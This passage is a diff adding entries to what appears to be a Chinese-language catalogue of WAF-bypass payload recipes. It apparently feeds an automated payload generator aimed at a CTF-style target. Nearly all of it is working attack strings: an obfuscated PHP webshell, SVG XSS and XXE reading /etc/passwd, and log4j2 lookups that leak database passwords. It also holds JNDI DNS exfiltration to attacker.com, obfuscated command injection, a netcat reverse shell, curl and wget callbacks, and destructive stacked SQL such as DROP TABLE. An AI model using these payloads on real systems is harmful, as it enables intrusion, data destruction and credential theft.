+- **payload**: `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>` 或内嵌 `<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`
+- **机制**: 上传 SVG 打存储型 XSS / XXE；WAF 不解析 XML 内容则漏。
+- **风险**: 需应用渲染/解析 SVG。
+- **变体**: 内嵌 script、外链资源。
+
+### recipe:upload_content_split_full — 内容混淆完整 webshell
+- **原语栈**: `upload:content:dynamic_function` × `upload:content:webshell_split`
+- **payload**: `<?php $a=$_GET['a'];@$a($_GET['b']);?>`
+- **机制**: 函数名完全由请求参数运行时决定，文件内无任何危险函数字面；静态扫描无目标。
+- **风险**: 需短标签/<?php 可用；`@` 抑制报错。
+- **变体**: `base64_decode`、`strrev`、XOR 字符串构造。
+
+### recipe:log4j2_bundle_cred — bundle 读配置凭据（已验证）
+- **原语栈**: `log4j2:lookup:info_disclosure`
+- **payload**: `${bundle:application:spring.datasource.password}`
+- **机制**: bundle lookup 读 ResourceBundle 配置值，泄露数据库密码/用户名；WAF 只盯 jndi/ldap 关键字漏非 JNDI lookup。
+- **✅ 已验证（2026-08）**: 本地 log4j2 2.14.1 实测 `${bundle:application:spring.datasource.password}` 解析出 `flag{...}`，远程 WAF 放行（HTTP 200）——**真实有效攻击**。
+- **变体**: `${bundle:application:spring.datasource.username}`、换配置键名。
+
+### recipe:log4j2_env_nested_exfil — 嵌套 DNS 外带环境变量
+- **原语栈**: `log4j2:lookup:env_nested_exfil`
+- **payload**: `${jndi:dns://${env:HOST}.attacker.com/}`
+- **机制**: 内层 `${env:...}` 先解析拼进外层 jndi:dns 域名，一次请求外带主机名/PATH/AWS 密钥；WAF 只拦外层 jndi 时漏内层 env。
+- **风险**: 需 DNS 外带通道可达；JNDI 在此 WAF 全拦（未突破，作跨 WAF 参考）。
+- **变体**: `${jndi:ldap://${sys:user.name}.attacker/}`。
+
+### recipe:log4j2_ctx_disclosure — 冷门 lookup 信息泄露
+- **原语栈**: `log4j2:lookup:ctx_chain`
+- **payload**: `${ctx:loginId}` / `${main:app.name}` / `${event:Marker}`
+- **机制**: ThreadContext/启动参数/日志事件 lookup，非 JNDI 泄露面；WAF 对 ctx/main/event 收录晚。
+- **⚠️ 实测（2026-08）**: event:Marker 本地无 Marker 时不解析（原样返回）；ctx/main 需应用设置了对应键才泄露。
+- **变体**: `${java:os}`、`${env:PATH}` 系统信息。
+
+### recipe:log4j2_lower_obfusc — 大小写/嵌套混淆 JNDI
+- **原语栈**: `log4j2:lookup:lower_upper` × `log4j2:protocol:nested_recursion`
+- **payload**: `${${lower:j}ndi:ldap://.../}`、`${jnd${upper:ı}:ldap://...}`
+- **机制**: lower/::-/Unicode 无点ı 折叠拆关键字，WAF 连续匹配失配。
+- **⚠️ 实测（2026-08）**: 本 WAF 对 JNDI 封锁严密，全部混淆变体仍被拦（作跨 WAF 参考）。
+- **变体**: 逐字符 `${::-j}${::-n}...`。
+
+### recipe:log4j2_proto_ports — 冷门协议 + 白名单端口
+- **原语栈**: `log4j2:proto:*` × `log4j2:lookup:port_whitelist`
+- **payload**: `${jndi:rmi://attacker:1099/x}`、`${jndi:ldap://attacker:8080/x}`
+- **机制**: rmi/dns 冷门协议与 80/443/8080 白名单端口绕过出站限制；JNDI 全拦场景作跨 WAF 参考。
+- **变体**: `${jndi:dns://...}` DNS 外带。
+
+### recipe:cmdi_proc_sub — 进程替换读文件
+- **原语栈**: `cmdi:syntactic:process_substitution` × `cmdi:syntactic:redir_read_alt`
+- **payload**: `cat <(/bin/cat /etc/hostname)`、`diff <(echo a) <(/bin/cat /etc/passwd)`
+- **机制**: `<(...)` 进程替换无管道无拼接，形态反直觉；WAF 对进程替换收录晚。
+- **变体**: `diff`/`comm` 双进程替换。
+
+### recipe:cmdi_env_exec — 环境变量构造命令
+- **原语栈**: `cmdi:semantic:env_exec` × `cmdi:syntactic:arith_expansion`
+- **payload**: `${PATH:0:1}??b/ca$((16#116)) /etc/hostname`、`a=cat;$a /etc/passwd`
+- **机制**: PATH 切片取斜杠、算术进制构造字符、glob 解析命令，命令名无任何字面。
+- **变体**: `${IFS}`、`$@` 空参数、`$()` 空命令替换。
+
+### recipe:cmdi_interp_feed — 解释器 + here-string 喂入
+- **原语栈**: `cmdi:syntactic:interp_read` × `cmdi:syntactic:here_string_feed`
+- **payload**: `bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)`、`sh -c 'cat /etc/hostname'`
+- **机制**: 显式解释器 + here-string 喂命令，明文无命令字面。
+- **变体**: `bash -c`/`sh -c`/`python -c`/`perl -e` 换解释器。
+
+### recipe:cmdi_oob_shell — 外带反弹 shell
+- **原语栈**: `cmdi:semantic:oob` × `cmdi:semantic:oob_http`
+- **payload**: `nc -lvp 4444 -e /bin/sh`、`wget http://attacker/x`、`curl http://attacker/$(whoami)`
+- **机制**: 外带通道（nc 反弹/wget/curl 回调）把数据或 shell 传到攻击者；与读文件不同的攻击目标。
+- **变体**: DNS 外带 `curl http://$(hostname).attacker.com`。
+
+---
+
+## 攻击类别补充（2026-08，跨场景发散用）
+
+> 前几轮生成收敛在 SELECT 关键字突变（UNION 族），本质原因是 Layer-1 种子偏窄 + Layer-2 只会词法变异。
+> 本段补齐"攻击类别"级原语，生成时必须**横切类别**，不能默认 UNION/基础形态。
+
+### sqli:semantic:time_blind — 时间盲注
+- **原理**: `SLEEP(5)`/`BENCHMARK(1000000,MD5(1))` 用响应延迟判真伪——payload 无 UNION/SELECT 列提取特征，WAF 对"延时函数+条件"的监控弱于对联合查询。
+- **风险**: 每字符一次请求很慢；WAF 可能拦 sleep/benchmark 关键字。
+- **模板**: `1 AND SLEEP(5)`、`1 AND BENCHMARK(1000000,MD5(1))`、`IF((SELECT 1 FROM flags LIMIT 1),SLEEP(3),0)`
+- **组合**: 与条件表达式（CASE/IF）组合做条件时间盲注。
+
+### sqli:semantic:stacked_query — 堆叠查询
+- **原理**: `1;UPDATE flags SET flag='x'` 用分号执行多条语句——WAF 通常只检首条；需驱动支持堆叠（PDO 模拟预处理）。
+- **风险**: 多数 ORM 禁堆叠；仅部分连接方式可用。
+- **模板**: `1;DROP TABLE flags-- -`、`1';SELECT SLEEP(3);-- -`
+- **组合**: 与注释矩阵叠加隐藏分号语义。
+
+### sqli:semantic:no_column_union — 无列名联合
+- **原理**: `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` 不写列名对齐列数——WAF 的 `SELECT 1,2,3` 模式不命中。
+- **模板**: `-1 UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT flag FROM flags)c`
+- **组合**: 与 JOIN 派生表（已有）同族。
+
+### cmdi:syntactic:process_substitution — 进程替换
+- **原理**: `cat <(echo hi)` 用 `<(命令)` 进程替换执行命令——不含管道符与直接命令拼接，形态反直觉。
+- **模板**: `cat <(/bin/ca$((16#74)) /etc/passwd)`、`diff <(echo a) <(/bin/cat /etc/passwd)`
+- **组合**: 与算术进制、glob 组合。
+
+### cmdi:syntactic:heredoc_doc — heredoc 喂入
+- **原理**: `bash<<<$(...)` 或 `cat<<EOF\ncmd\nEOF` 用 heredoc/here-string 传命令或读数据——无管道、无直接拼接。
+- **模板**: `bash<<<$(base64 -d<<<...);`、`cat<<EOF\n/pass\nEOF`（读文件内容）
+- **组合**: 与 base64/hex 编码维度（未来）组合。
+
+### cmdi:semantic:env_exec — 环境变量执行
+- **原理**: `$IFS`/`$PATH` 等变量参与命令构造（`${PATH:0:1}` 取字符），命令无字面。
+- **模板**: `${PATH:0:1}??$()bin$()/ca$((16#116))$() ...`、`a=cat;$a /etc/passwd`
+- **组合**: 与空参数/空命令替换组合。
+
+### xss:semantic:dom_clobber_deep — DOM 遮蔽链
+- **原理**: `<img id=x name=alert><form name=f><input name=x></form>` 用 id/name 遮蔽 window 属性，`window.f.x` 取到对象——无 script 无事件，纯 HTML 结构。
+- **风险**: 需页面 JS 引用了被遮蔽的全局变量。
+- **模板**: `<img id=alert><form name=f><input name=x onchange=alert(1)>`
+- **组合**: 与模板字面量/原型链污染。
+
+### upload:content:user_ini_prepend — .user.ini 自动加载
+- **原理**: `.user.ini` 的 `auto_prepend_file=1.jpg` + 图片马——不用 .htaccess，PHP-FPM 场景更通用。
+- **模板**: `.user.ini` 内容 `auto_prepend_file=2.png`；配 2.png 图片马
+- **组合**: 与 magic_bytes 图片马组合。
+
+### log4j2:lookup:ctx_chain — 上下文 lookup 链
+- **原理**: `${ctx:loginId}` 读 ThreadContext、`${event:...}` 读日志事件——非 JNDI 冷门 lookup，WAF 规则收录晚。
+- **模板**: `${ctx:loginId}`、`${event:Marker}`、`${main:app.name}`
+- **组合**: 与 bundle/env 同属非 JNDI 泄露面。
